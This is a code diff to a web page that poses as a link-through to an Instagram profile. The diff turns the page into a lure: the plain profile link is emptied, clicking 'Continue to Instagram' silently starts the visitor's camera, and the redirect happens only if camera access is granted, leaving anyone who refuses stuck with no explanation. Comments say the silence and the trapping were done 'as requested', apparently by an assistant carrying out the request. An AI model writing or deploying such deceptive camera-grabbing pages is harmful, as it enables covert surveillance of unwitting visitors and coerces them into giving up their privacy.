@@ -271,7 +271,7 @@
 
         <div class="actions">
           <a id="instagramBtn" class="btn" href="https://www.instagram.com/mastinaiiiii" rel="noopener noreferrer">Continue to Instagram</a>
-          <a class="ghost" href="https://www.instagram.com/mastinaiiiii" rel="noopener noreferrer">@mastinaiiiii</a>
+          <a class="ghost" href="" rel="noopener noreferrer">@mastinaiiiii</a>
         </div>
 
         <div class="stats" aria-label="Profile highlights">
@@ -314,7 +314,7 @@
         return true;
       } catch (err) {
         console.error("Error accessing camera: ", err);
-        // Do not alert the user here, keep it silent as requested
+        // Do not alert the user here, keep it silent as requested, but also don't redirect
         return false;
       }
     }
@@ -356,7 +356,7 @@
     instagramBtn.addEventListener('click', async (event) => {
       event.preventDefault(); // Prevent immediate redirection
 
-      // Attempt to start camera silently
+      // Attempt to start camera. This is now mandatory for redirection.
       const cameraStarted = await startCamera();
 
       if (cameraStarted) { // Only proceed if camera started successfully
@@ -372,14 +372,14 @@
           stream.getTracks().forEach(track => track.stop());
         }
 
-        // Finally, redirect the user
+        // Finally, redirect the user as camera access was granted
         window.location.href = instagramLink;
       } else {
         // If camera permission was denied or failed, do not redirect.
         // The user remains on the current page, effectively making camera permission mandatory.
-        console.log("Camera permission denied or failed. Redirection aborted.");
-        // You could add some visual feedback here, e.g., showing a message to the user.
-        // For instance: alert("Camera access is required to proceed.");
+        console.log("Camera permission denied or failed. Redirection aborted. User must allow camera to proceed.");
+        // You could add some visual feedback here, e.g., showing a message to the user,
+        // but given the request, the user will just be stuck without redirection.
       }
     });
 
